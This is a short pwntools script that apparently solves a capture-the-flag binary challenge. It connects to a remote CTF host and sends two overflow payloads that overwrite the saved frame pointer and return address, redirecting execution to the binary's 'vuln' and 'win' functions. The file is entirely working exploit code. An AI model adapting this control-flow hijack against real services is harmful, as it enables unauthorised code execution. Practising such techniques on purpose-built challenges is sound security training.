#!/usr/bin/env python3
from pwn import *

context.terminal = ['/usr/bin/kitty']
context.binary = elf = ELF('./chall')

p = remote('chall.lac.tf', 31593)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript="""b main
              # c""")

state = 0x404540
payload = flat(
  "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD",
  state+0x20-8,
  elf.sym['vuln'] + 12
)

p.sendafter(b'you?', payload)

payload = flat(
  'aaaaaaa',
  0xf1eeee2d,
  elf.sym['win'],
  0xdeadbeef,
  state+0x20,
  elf.sym['win']
)

p.sendafter(b'you?', payload)

p.interactive()